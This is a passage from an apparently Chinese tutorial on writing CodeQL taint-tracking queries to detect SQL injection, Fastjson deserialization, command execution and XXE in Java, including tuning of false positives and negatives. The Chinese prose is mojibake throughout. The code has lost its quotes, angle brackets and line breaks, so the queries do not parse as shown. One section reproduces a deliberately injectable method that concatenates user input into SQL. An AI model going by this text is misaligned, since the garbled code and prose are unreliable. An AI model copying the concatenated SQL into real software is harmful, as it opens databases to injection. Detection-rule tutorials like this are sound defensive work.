isSink(DataFlow::Node sink) exists(Method method, MethodCall call | method.hasName(query) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) /** ç”¨å…¨å±€ taint tracking å»ºç«‹è·¯å¾„ */module VulFlow = TaintTracking::GlobalVulConfig;from VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source, sink, å‘ç°æ½œåœ¨çš„SQLæ³¨å…¥æ¼æ´ VulConfigï¼šè‡ªå®šä¹‰ä¸€ä¸ªæ±¡ç‚¹è¿½è¸ªé…ç½®ã€‚ extends TaintTracking::Configurationï¼šç»§æ‰¿ CodeQL æä¾›çš„æ±¡ç‚¹åˆ†ææ¡†æ¶ã€‚ æ„é€ å‡½æ•°é‡Œ this = SqlInjectionConfigï¼šç»™è¿™ä¸ªé…ç½®èµ·ä¸ªåå­—ã€‚ è¯¯æŠ¥è§£å†³ç»“æœé‡Œé¢å­˜åœ¨è¯¯æŠ¥ è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹æ˜¯ListLongï¼Œä¸å¯èƒ½å­˜åœ¨æ³¨å…¥æ¼æ´ã€‚ è¿™è¯´æ˜æˆ‘ä»¬çš„è§„åˆ™é‡Œï¼Œå¯¹äºListLongï¼Œç”šè‡³ListIntegerç±»å‹éƒ½ä¼šäº§ç”Ÿè¯¯æŠ¥ï¼Œsourceè¯¯æŠŠè¿™ç§ç±»å‹çš„å‚æ•°æ¶µç›–äº†ã€‚ æˆ‘ä»¬éœ€è¦é‡‡å–æ‰‹æ®µæ¶ˆé™¤è¿™ç§è¯¯æŠ¥ã€‚ è¿™ä¸ªæ‰‹æ®µå°±æ˜¯isSanitizerã€‚ isSanitizeræ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„å‡€åŒ–æ–¹æ³•ã€‚å®ƒçš„å‡½æ•°åŸå‹æ˜¯ï¼š override predicate isSanitizer(DataFlow::Node node) {} åœ¨CodeQLè‡ªå¸¦çš„é»˜è®¤è§„åˆ™é‡Œï¼Œå¯¹å½“å‰èŠ‚ç‚¹æ˜¯å¦ä¸ºåŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ã€‚ override predicate isSanitizer(DataFlow::Node node) {node.getType() instanceof PrimitiveType ornode.getType() instanceof BoxedType ornode.getType() instanceof NumberType} è¡¨ç¤ºå¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯ä¸Šé¢æåˆ°çš„åŸºç¡€ç±»å‹ï¼Œé‚£ä¹ˆæ­¤æ±¡æŸ“é“¾å°†è¢«å‡€åŒ–é˜»æ–­ï¼Œæ¼æ´å°†ä¸å­˜åœ¨ã€‚ ç”±äºCodeQLæ£€æµ‹SQLæ³¨å…¥é‡Œçš„isSanitizeræ–¹æ³•ï¼Œåªå¯¹åŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ï¼Œå¹¶æ²¡æœ‰å¯¹è¿™ç§å¤åˆç±»å‹åšåˆ¤æ–­ï¼Œæ‰å¼•èµ·äº†è¿™æ¬¡è¯¯æŠ¥é—®é¢˜ã€‚ é‚£æˆ‘ä»¬åªéœ€è¦å°†è¿™ç§å¤åˆç±»å‹åŠ å…¥åˆ°isSanitizeræ–¹æ³•ï¼Œå³å¯æ¶ˆé™¤è¿™ç§è¯¯æŠ¥ã€‚ åœ¨æ–°ç‰ˆæœ¬é‡Œé¢isSanitizeræ–¹æ³•å·²ç»å…¨éƒ¨ç»Ÿä¸€åˆ°isBarrieræ–¹æ³•ä¸‹äº† predicate isBarrier(DataFlow::Node node) node.getType() instanceof PrimitiveType or // åŸºæœ¬ç±»å‹ï¼ˆint, charç­‰ï¼‰ node.getType() instanceof BoxedType or // åŒ…è£…ç±»å‹ï¼ˆInteger, Booleanç­‰ï¼‰ node.getType() instanceof NumberType or // æ•°å­—ç±»å‹ exists(ParameterizedType pt| // æ³›å‹ç±»å‹ node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType // æ³›å‹å‚æ•°ä¸ºæ•°å­—ç±»å‹ ) ä»¥ä¸Šä»£ç çš„æ„æ€ä¸ºï¼šå¦‚æœå½“å‰nodeèŠ‚ç‚¹çš„ç±»å‹ä¸ºåŸºç¡€ç±»å‹ï¼Œæ•°å­—ç±»å‹å’Œæ³›å‹æ•°å­—ç±»å‹(æ¯”å¦‚List)æ—¶ï¼Œå°±åˆ‡æ–­æ•°æ®æµï¼Œè®¤ä¸ºæ•°æ®æµæ–­æ‰äº†ï¼Œä¸ä¼šç»§ç»­å¾€ä¸‹æ£€æµ‹ã€‚é‡æ–°æ‰§è¡Œqueryï¼Œæˆ‘ä»¬å‘ç°ï¼Œåˆšæ‰é‚£æ¡è¯¯æŠ¥å·²ç»è¢«æˆåŠŸæ¶ˆé™¤å•¦ã€‚ æ¼æŠ¥è§£å†³æˆ‘ä»¬å‘ç°ï¼Œå¦‚ä¸‹çš„SQLæ³¨å…¥å¹¶æ²¡æœ‰è¢«CodeQLæ•æ‰åˆ°ã€‚ public ListStudent getStudentWithOptional(OptionalString username) String sqlWithOptional = select * from students where username like % + username.get() + %; //String sql = select * from students where username like ?; return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER); æ¼æŠ¥ç†è®ºä¸Šè®²æ˜¯ä¸èƒ½æ¥å—çš„ã€‚å¦‚æœå‡ºç°è¯¯æŠ¥æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡äººå·¥ç­›é€‰æ¥è§£å†³ï¼Œä½†æ˜¯æ¼æŠ¥ä¼šå¯¼è‡´å¾ˆå¤šæ¼æ´æµç»ä¸‹ä¸€ä¸ªç¯èŠ‚åˆ°çº¿ä¸Šï¼Œä»è€Œäº§ç”ŸæŸå¤±ã€‚ é‚£æˆ‘ä»¬å¦‚æœé€šè¿‡CodeQLæ¥è§£å†³æ¼æŠ¥é—®é¢˜å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯é€šè¿‡ isAdditionalTaintStep æ–¹æ³•ã€‚ å®ç°åŸç†å°±ä¸€å¥è¯ï¼šæ–­äº†å°±å¼ºåˆ¶ç»™å®ƒæ¥ä¸Šã€‚ isAdditionalTaintStepæ–¹æ³•æ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„çš„æ–¹æ³•ï¼Œå®ƒçš„åŸå‹æ˜¯ï¼šoverride predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) å®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå¯æ§èŠ‚ç‚¹Aå¼ºåˆ¶ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹Ÿå°±æˆäº†å¯æ§èŠ‚ç‚¹ã€‚ è¿™é‡Œç”±äº Optional è¿™ç§ç±»å‹çš„ä½¿ç”¨æ²¡æœ‰åœ¨ CodeQL çš„è¯­æ³•åº“é‡Œï¼Œæˆ‘ä»¬éœ€è¦å¼ºåˆ¶è®© username æµè½¬åˆ°username.get()ï¼Œè¿™æ · username.get() å°±å˜å¾—å¯æ§äº†ã€‚è¿™æ ·åº”è¯¥å°±èƒ½è¯†åˆ«å‡ºè¿™ä¸ªæ³¨å…¥æ¼æ´äº† åœ¨æ–°ç‰ˆçš„qlä¸­ä½¿ç”¨ isAdditionalFlowStep è€Œä¸æ˜¯æ±¡ç‚¹è·Ÿè¸ªè°“è¯ isAdditionalTaintStep å®Œæ•´ä»£ç ï¼š /** * @id java/examples/demo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcespredicate isTaintedString(Expr expSrc, Expr expDest) exists(Method method, MethodCall call, MethodCall call1| expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method and method.hasName(get) and method.getDeclaringType().toString() = OptionalString and call1.getArgument(0).getType().toString() = OptionalString )/** å®šä¹‰æ•°æ®æµé…ç½® */module VulConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(Method method, MethodCall call | method.hasName(query) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) predicate isBarrier(DataFlow::Node node) node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) // è¿™é‡Œçš„ ParameterizedType ä»£è¡¨æ‰€æœ‰æ³›å‹ï¼Œåˆ¤æ–­æ³›å‹å½“ä¸­çš„ä¼ å‚æ˜¯å¦ä¸º Number å‹ predicate isAdditionalFlowStep(DataFlow::Node node1, DataFlow::Node node2) isTaintedString(node1.asExpr(), node2.asExpr()) /** ç”¨å…¨å±€ taint tracking å»ºç«‹è·¯å¾„ */module VulFlow = TaintTracking::GlobalVulConfig;import VulFlow::PathGraphfrom VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source.getNode(), source, sink, source Lombok æ’ä»¶æ¼æŠ¥Lombok çš„æ³¨è§£å¹¶ä¸ä¼šç›´æ¥è¢« CodeQL æ‰€è§£æï¼Œå¯¼è‡´å…¶ä¸­çš„ä¸­é—´é“¾è·¯ä¼šâ€œä¸­é“å´©æ®‚â€ï¼Œæˆ‘ä»¬ç”¨ä»¥ä¸‹æ–¹æ³•æ¥è§£å†³ã€‚ è§£å†³æ–¹æ³• â‘ ä½¿ç”¨ maven-delombokï¼Œåœ¨ pom.xml ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œé‡æ–°ç¼–è¯‘å³å¯ã€‚ï¼ˆæ¨èï¼‰ build sourceDirectorytarget/generated-sources/delombok/sourceDirectory testSourceDirectorytarget/generated-test-sources/delombok/testSourceDirectory plugins plugin groupIdorg.projectlombok/groupId artifactIdlombok-maven-plugin/artifactId version1.18.20.0/version executions execution iddelombok/id phasegenerate-sources/phase goals goaldelombok/goal /goals configuration addOutputDirectoryfalse/addOutputDirectory sourceDirectorysrc/main/java/sourceDirectory /configuration /execution execution idtest-delombok/id phasegenerate-test-sources/phase goals goaltestDelombok/goal /goals configuration addOutputDirectoryfalse/addOutputDirectory sourceDirectorysrc/test/java/sourceDirectory /configuration /execution /executions /plugin plugin groupIdorg.springframework.boot/groupId artifactIdspring-boot-maven-plugin/artifactId /plugin /plugins /build è§£å†³åŠæ³• â‘¡CodeQLå®˜æ–¹çš„issueé‡Œé¢ï¼Œæœ‰äººç»™å‡ºäº†è¿™ä¸ªé—®é¢˜çš„è§£å†³åŠæ³• https://github.com/github/codeql/issues/4984 # get a copy of lombok.jarwget https://projectlombok.org/downloads/lombok.jar -O lombok.jar# run delombok on the source files and write the generated files to a folder named delombokjava -jar lombok.jar delombok -n --onlyChanged . -d delombok# remove generated by commentsfind delombok -name *.java -exec sed /Generated by delombok/d -i ;# remove any left-over import statementsfind delombok -name *.java -exec sed /import lombok/d -i ;# copy delombokd files over the original onescp -r delombok/. ./# remove the delombok folderrm -rf delombok æ²¡æœ‰ç‰¹åˆ«æ˜ç™½è¿™ä¸ªåº”è¯¥åœ¨å“ªä¸ªç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ã€‚ ä¸Šé¢çš„ä»£ç ï¼Œå®ç°çš„åŠŸèƒ½æ˜¯ï¼šå»æ‰ä»£ç é‡Œçš„lombokæ³¨è§£ï¼Œå¹¶è¿˜åŸsetterå’Œgetteræ–¹æ³•çš„javaä»£ç ï¼Œä»è€Œä½¿CodeQLçš„Flowæµèƒ½å¤Ÿé¡ºåˆ©èµ°ä¸‹å»ï¼Œä»è€Œæ£€ç´¢åˆ°å®‰å…¨æ¼æ´ã€‚ æŒç»­å·¥ç¨‹åŒ–åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬ç¼–å†™äº†SQLæ³¨å…¥çš„æŸ¥è¯¢è¯­å¥ï¼Œæ¶ˆé™¤äº†è¯¯æŠ¥å’Œæ¼æŠ¥é—®é¢˜ã€‚å½“å‰çš„è§„åˆ™å·²ç»èƒ½å¤Ÿé€‚åº”micro-service-seclabé¡¹ç›®å•¦ã€‚ å› ä¸ºæˆ‘ä»¬çš„micro-service-seclabé¡¹ç›®ï¼Œæ˜¯æŒ‰ç…§æ ‡å‡†ç”Ÿæˆçš„å¾®æœåŠ¡ç»“æ„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªqlè§„åˆ™å»è·‘å…¶ä»–çš„é¡¹ç›®ï¼Œæ¥è‡ªåŠ¨åŒ–æ£€æµ‹å…¶å®ƒé¡¹ç›®ï¼Œä»è€Œåšåˆ°è‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œæé«˜å®‰å…¨æ£€æµ‹æ•ˆç‡ã€‚ CodeQLé™¤äº†æä¾›VSCodeçš„æ£€æµ‹æ’ä»¶ï¼Œä¹Ÿæä¾›äº†å¤§é‡çš„å‘½ä»¤è¡Œï¼Œæ¥å®ç°é¡¹ç›®çš„é›†æˆæ£€æµ‹ã€‚ æ¯”å¦‚ï¼š codeql database create ~/CodeQL/databases/micro-service-seclab --language=java --command=mvn clean install --file pom.xml -Dmaven.test.skip=true --source-root=~/Code/micro-service-seclab/ æˆ‘ä»¬é€šè¿‡ä¸Šé¢è¯­å¥è‡ªåŠ¨ç”Ÿæˆcodeqlçš„ä¸­é—´æ•°æ®åº“(database)ã€‚ codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„è¯­å¥å¯ä»¥æ‰§è¡Œæˆ‘ä»¬å†™å¥½çš„QLæ–‡ä»¶ï¼Œç„¶åå°†ç»“æœè¾“å‡ºåˆ°æŒ‡å®šcsvæ–‡ä»¶ã€‚ åˆ©ç”¨è¿™ä¸¤æ¡å‘½ä»¤ï¼Œç»“åˆæˆ‘ä»¬è‡ªå·±çš„ç¨‹åºï¼Œæˆ‘ä»¬å°±èƒ½æ‰¹é‡çš„å¯¹æˆ‘ä»¬æ‰€æœ‰çš„é¡¹ç›®åšè‡ªåŠ¨åŒ–æ£€æµ‹äº†ã€‚ CodeQLè¿›é˜¶ä¸Šé¢æˆ‘ä»¬å®Œæˆäº†å¯¹ä¸€ä¸ªç®€å•çš„SQLæ³¨å…¥æ¼æ´çš„è‡ªåŠ¨åŒ–æ£€æµ‹å·¥ä½œã€‚ å¦‚æœä½ å¯¹ä¸Šé¢çš„è¯­æ³•çš„ä¸€äº›ä¸œè¥¿è¿˜æ˜¯æœ‰äº›ä¸è§£ï¼Œæˆ–è€…æƒ³å»é˜…è¯»SDKè§„åˆ™çš„ä»£ç ï¼Œå¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå¸Œæœ›æˆ‘å¯¹ä¸€äº›é‡ç‚¹è¯­æ³•çš„æ€»ç»“èƒ½å¤Ÿå¸®åˆ°ä½ ã€‚ ç”¨ instanceof æ›¿ä»£å¤æ‚æŸ¥è¯¢è¯­å¥é—®é¢˜æˆ‘ä»¬åœ¨ä¸Šé¢çš„æ¡ˆä¾‹å½“ä¸­çœ‹åˆ°äº†instanceof, å¦‚æœæˆ‘ä»¬å»çœ‹qlè‡ªå¸¦çš„è§„åˆ™åº“ï¼Œä¼šå‘ç°å¤§é‡çš„instanceofè¯­å¥ã€‚ instanceofæ˜¯ç”¨æ¥ä¼˜åŒ–ä»£ç ç»“æ„éå¸¸å¥½çš„è¯­æ³•ç³–ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨exists(|)è¿™ç§å­æŸ¥è¯¢çš„æ–¹å¼å®šä¹‰sourceå’Œsinkï¼Œä½†æ˜¯å¦‚æœsourcesinkç‰¹åˆ«å¤æ‚ï¼ˆæ¯”å¦‚æˆ‘ä»¬ä¸ºäº†è§„åˆ™é€šç”¨ï¼Œå¯èƒ½è¦é€‚é…springbootï¼Œ Thrift RPCï¼ŒServletç­‰sourceï¼‰ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¿™äº›éƒ½åœ¨ä¸€ä¸ªå­æŸ¥è¯¢å†…å®Œæˆï¼Œæ¯”å¦‚ condition 1 or conditon 2 or condition 3, è¿™æ ·ä¸€ç›´ä¸‹å»ï¼Œæˆ‘ä»¬å¯èƒ½åé¢éƒ½çœ‹ä¸æ‡‚äº†ï¼Œæ›´åˆ«è¯´å¯ç»´æŠ¤æ€§äº†ã€‚å†µä¸”æœ‰äº›æƒ…å†µå¦‚æœä¸€ä¸ªå­æŸ¥è¯¢æ— æ³•å®Œæˆï¼Œé‚£ä¹ˆå°±æ›´æ²¡æ³•å†™äº†ã€‚ instanceofç»™æˆ‘ä»¬æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œæˆ‘ä»¬åªéœ€è¦å®šä¹‰ä¸€ä¸ªabstract classï¼Œæ¯”å¦‚è¿™ä¸ªæ¡ˆä¾‹å½“ä¸­çš„: /** A data flow source of remote user input. */abstract class RemoteFlowSource extends DataFlow::Node /** Gets a string that describes the type of this remote flow source. */ abstract string getSourceType(); ç„¶ååœ¨isSourceæ–¹æ³•é‡Œè¿›è¡Œinstanceofï¼Œåˆ¤æ–­srcæ˜¯ RemoteFlowSourceç±»å‹å°±å¯ä»¥äº†ã€‚ override predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource å­¦è¿‡javaçš„äººå¯èƒ½ä¼šå¾ˆè´¹è§£ï¼Œæˆ‘ä»¬ç»§æ‰¿äº†ä¸€ä¸ªabstractæŠ½è±¡ç±»ï¼Œè¿ä¸ªå®ç°æ–¹æ³•éƒ½æ²¡æœ‰ï¼Œæ€ä¹ˆå°±èƒ½å¤Ÿè¾¾åˆ°è·å–å„ç§sourceçš„ç›®çš„å‘¢ï¼Ÿ CodeQLå’ŒJavaä¸å¤ªä¸€æ ·ï¼Œåªè¦æˆ‘ä»¬çš„å­ç±»ç»§æ‰¿äº†è¿™ä¸ªRemoteFlowSourceç±»ï¼Œé‚£ä¹ˆæ‰€æœ‰å­ç±»å°±ä¼šè¢«è°ƒç”¨ï¼Œå®ƒæ‰€ä»£è¡¨çš„sourceä¹Ÿä¼šè¢«åŠ è½½ã€‚ æˆ‘ä»¬åœ¨ RemoteFlowSourceå®šä¹‰ä¸‹é¢ä¼šçœ‹åˆ°éå¸¸å¤šå­ç±»ï¼Œå°±æ˜¯è¿™ä¸ªé“ç†ï¼Œå®ƒä»¬çš„ç»“æœéƒ½ä¼šè¢«ç”¨andä¸²è”åŠ è½½ã€‚ é€’å½’é—®é¢˜é€’å½’è°ƒç”¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬è§£å†³ä¸€ç±»é—®é¢˜ï¼šå°±æ˜¯æˆ‘ä»¬ä¸ç¡®å®šè¿™ä¸ªæ–¹æ³•æˆ‘ä»¬éœ€è¦è°ƒç”¨å¤šå°‘æ¬¡æ‰èƒ½å¾—åˆ°æˆ‘ä»¬çš„ç»“æœï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨é€’å½’è°ƒç”¨ã€‚ CodeQLé‡Œé¢çš„é€’å½’è°ƒç”¨è¯­æ³•æ˜¯ï¼šåœ¨è°“è¯æ–¹æ³•çš„åé¢è·Ÿ*æˆ–è€…+ï¼Œæ¥è¡¨ç¤ºè°ƒç”¨0æ¬¡ä»¥ä¸Šå’Œ1æ¬¡ä»¥ä¸Šï¼ˆå’Œæ­£åˆ™ç±»ä¼¼ï¼‰ï¼Œ0æ¬¡ä¼šæ‰“å°è‡ªå·±ã€‚æˆ‘ä»¬ä¸¾ä¸€ä¸ªä¾‹å­ï¼š åœ¨Javaè¯­è¨€é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨classåµŒå¥—classï¼Œå¤šä¸ªå†…åµŒclassçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æœ€å¤–å±‚çš„classæ˜¯ä»€ä¹ˆæ€ä¹ˆåŠï¼Ÿæ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š public class StudentService class innerOne public innerOne() class innerTwo public innerTwo() public String Nihao() return Nihao; public String Hi() return hello; æˆ‘ä»¬æƒ³è¦æ ¹æ®innerTwoç±»å®šä½åˆ°æœ€å¤–å±‚çš„StudentServiceç±»ï¼Œæ€ä¹ˆå®ç°ï¼Ÿ æŒ‰ç…§éé€’å½’çš„å†™æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š import java from Class classeswhere classes.getName().toString() = innerTwoselect classes.getEnclosingType().getEnclosingType() // getEnclosingtypeè·å–ä½œç”¨åŸŸ æˆ‘ä»¬é€šè¿‡è¿ç»­2æ¬¡è°ƒç”¨getEnclosingTypeæ–¹æ³•æ˜¯èƒ½å¤Ÿæ‹¿åˆ°æœ€å¤–å±‚çš„StudentServiceçš„ã€‚ ä½†æ˜¯æ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œå®é™…æƒ…å†µæ˜¯æˆ‘ä»¬å¹¶ä¸æ¸…æ¥šä¸€å…±æœ‰å¤šå°‘å±‚åµŒå¥—ï¼Œè€Œä¸”å¤šä¸ªæ–‡ä»¶å¯èƒ½æ¯ä¸ªçš„åµŒå¥—æ•°é‡éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬æ²¡æ³•ç”¨ç¡®å®šçš„è°ƒç”¨æ¬¡æ•°æ¥è§£å†³æ­¤é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨é€’å½’çš„æ–¹å¼è§£å†³ã€‚ æˆ‘ä»¬åœ¨è°ƒç”¨æ–¹æ³•åé¢åŠ *(ä»æœ¬èº«å¼€å§‹è°ƒç”¨)æˆ–è€…+(ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨)ï¼Œæ¥è§£å†³æ­¤é—®é¢˜ã€‚ from Class classeswhere classes.getName().toString() = innerTwoselect classes.getEnclosingType+() // è·å–ä½œç”¨åŸŸ æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±å°è£…æ–¹æ³•æ¥é€’å½’è°ƒç”¨ import java RefType demo(Class classes) result = classes.getEnclosingType() from Class classeswhere classes.getName().toString() = innerTwoselect demo*(classes) // è·å–ä½œç”¨åŸŸ å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜åœ¨CodeQLçš„è§„åˆ™é›†é‡Œï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å¾ˆå¤šç±»å‹è½¬æ¢çš„ä»£ç ï¼Œæ¯”å¦‚ï¼š è¿™é‡Œæ˜¯å¯¹getType()çš„è¿”å›ç»“æœåšå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å…¶å®CodeQLå½“ä¸­çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œç†è§£æˆfilteræ›´è´´åˆ‡ä¸€ç‚¹ï¼Œå®ƒçš„æ„æ€æ˜¯å°†å‰é¢çš„ç»“æœç¬¦åˆRefTypeçš„æ•°æ®éƒ½ç•™ä¸‹ï¼Œä¸ç¬¦åˆçš„éƒ½å»æ‰ã€‚ ä»¥ä¸Šclass ç»§æ‰¿äº†Parameterï¼Œé‚£ä¹ˆgetType()ç›®çš„å°±æ˜¯è·å–é¡¹ç›®ä¸­æ‰€æœ‰çš„å‚æ•°çš„typeä¿¡æ¯ã€‚ æˆ‘ä»¬ç”¨å¦‚ä¸‹QLè¯­å¥åšä¸ªæµ‹è¯•ï¼š import java from Parameter paramselect param, param.getType() ä»¥ä¸Šä»£ç çš„å«ä¹‰æ˜¯æ‰“å°æ‰€æœ‰æ–¹æ³•å‚æ•°çš„åç§°å’Œç±»å‹ã€‚ æˆ‘ä»¬çœ‹åˆ°ä¸€å…±æœ‰233æ¡ç»“æœï¼Œå¹¶ä¸”ç»“æœå½“ä¸­å«æœ‰Stringï¼Œintå’Œå…¶ä»–è‡ªå®šä¹‰ç±»å‹ï¼Œè¿™æ˜¯æˆ‘ä»¬æ²¡æœ‰åšä»»ä½•å¼ºåˆ¶ç±»å‹è½¬æ¢çš„ç»“æœã€‚ç„¶åæˆ‘ä»¬è¯•ç€æ‰§è¡Œï¼š import java from Parameter paramselect param, param.getType().(RefType) å¼ºåˆ¶è½¬æ¢æˆRefTypeï¼Œæ„æ€å°±æ˜¯ä»å‰é¢çš„ç»“æœå½“ä¸­è¿‡æ»¤å‡ºRefTypeç±»å‹çš„å‚æ•°ã€‚RefTypeæ˜¯ä»€ä¹ˆï¼Ÿå¼•ç”¨ç±»å‹ï¼Œè¯´ç™½äº†å°±æ˜¯å»æ‰intç­‰åŸºç¡€ç±»å‹ä¹‹åçš„æ•°æ®ã€‚ æ•°æ®åªæœ‰181æ¡äº†ã€‚ æ›´ç›´è§‚çš„æµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥è¿‡æ»¤ä¿ç•™æ‰€æœ‰çš„æ•°å€¼ç±»å‹ã€‚ import java from Parameter paramselect param, param.getType().(IntegralType) å†…å­˜çˆ†ç‚¸è§£å†³åŠæ³•å¦‚æœä½ ç°åœ¨æ˜¯ **æ–°ç‰ˆæœ¬ CodeQL CLI (2.9.x)**ï¼š æ•°æ®åº“åˆ›å»ºæ—¶ï¼š export SEMMLE_JAVA_EXTRACTOR_JVM_ARGS=-Xmx4gcodeql database create db --language=java -s . -M 4000 æŸ¥è¯¢æ—¶ç”¨ï¼š codeql database analyze db query.ql --ram=4000 å¦‚æœä½ è¿˜æ˜¯è€ç‰ˆæœ¬ï¼š æ•°æ®åº“åˆ›å»ºæ—¶åªèƒ½ç”¨ï¼š codeql database create db --language=java -s . -J=-Xmx4g FastJson/** * @id java/examples/fastjson * @name Fastjson * @description fastjson * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcesmodule FastjsonVulconfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(Method method, MethodCall call | method.hasName(parseObject) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) module fastjsonFlow = TaintTracking::GlobalFastjsonVulconfig;import fastjsonFlow::PathGraphfrom fastjsonFlow::PathNode source, fastjsonFlow::PathNode sinkwhere fastjsonFlow::flowPath(source, sink)select source.getNode(), source, sink, source Rce/** * @id java/examples/rce * @name Rce * @description rce * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcesmodule RceVulconfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) sink.asExpr() instanceof ArgumentToExec //ArgumentToExecè¡¨ç¤ºä¼ é€’ç»™å‘½ä»¤æ‰§è¡Œçš„å‚æ•° module rceFlow = TaintTracking::GlobalRceVulconfig;import rceFlow::PathGraphfrom rceFlow::PathNode source, rceFlow::PathNode sinkwhere rceFlow::flowPath(source, sink)select source.getNode(), source, sink, source XXE/** * @id java/examples/vuldemo/xxe * @name xxe * @description xxe-vul * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.dataflow.ExternalFlow import DataFlow::PathGraph class XXEVulConfig extends TaintTracking::Configuration XXEVulConfig() this = XXEVulConfig override predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource override predicate isSink(DataFlow::Node sink) exists(Method method, MethodAccess call| method.hasName(parse) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) from XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sinkwhere xxeVulConfig.hasFlowPath(source, sink)select source.getNode(), source, sink, source ä¸‹é¢æ˜¯å…¶ä»–æ–‡ç« ä¸­ä¸ªäººå†³å®šæœ‰ç”¨çš„ç‚¹ è‡ªå†™è§„åˆ™æ¨¡æ¿å†™è„šæœ¬ç†Ÿç»ƒä¹‹åï¼Œå°±ç»å¸¸ç”¨è¿™ä¸ªæ¥å†™è§„åˆ™äº†ï¼Œå¼€ç®±å³ç”¨ã€‚ /** * @kind path-problem */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesmodule MyConfiguration implements DataFlow::ConfigSig predicate isSource(DataFlow::Node source) source instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(MethodCall methodCall | methodCall.getMethod().getName() = methodName and methodCall.getQualifier().getType().getName() = ClassName and sink.asExpr() = methodCall.getAnArgument() ) module Flow = DataFlow::GlobalMyConfiguration;import Flow::PathGraphfrom Flow::PathNode source, Flow::PathNode sinkwhere Flow::flowPath(source, sink)select sink.getNode(), source, sink,xxxInfo RCE Shiro ç§˜é’¥ç¡¬ç¼–ç æŸ¥è¯¢ï¼ˆæ”¯æŒæ–°ç‰ˆè¯­æ³•ï¼‰è¯­æ³•å·²åºŸå¼ƒï¼Œæ–°ç‰ˆä¸­é»˜è®¤å·²æ”¯æŒè¯¥è§„åˆ™ã€‚ 